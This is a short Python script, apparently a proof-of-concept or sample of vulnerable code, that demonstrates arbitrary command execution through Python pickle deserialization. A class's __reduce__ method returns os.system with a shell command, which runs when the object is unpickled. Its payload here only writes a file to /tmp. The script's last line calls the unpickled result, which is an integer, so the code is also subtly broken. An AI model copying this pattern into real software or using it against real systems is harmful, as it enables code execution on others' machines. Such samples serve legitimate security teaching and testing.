import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo "I am evil!" > /tmp/evil_output.txt',))

def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized

if __name__ == '__main__':
    evil_instance = EvilClass()
    deserialized_instance = serialize_and_deserialize(evil_instance)
    deserialized_instance()
